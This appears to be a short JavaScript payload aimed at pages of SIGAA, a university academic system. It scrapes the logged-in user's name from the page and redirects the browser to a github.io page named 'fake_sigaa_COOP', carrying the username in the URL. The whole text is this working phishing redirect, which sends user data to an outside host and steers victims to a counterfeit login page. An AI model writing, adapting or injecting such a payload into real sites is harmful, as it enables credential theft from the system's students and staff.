var x = document.getElementById("info-usuario").innerHTML;
	y = x.split('title=');
	y = y[1].split('>')
	y = y[1].split('<')
	a = "https://rodrigorochapinto.github.io/pages-teste/paginas/fake_sigaa_COOP.html?usuario="
	b = y[0]
	c = a.concat(b)
window.location.href = c




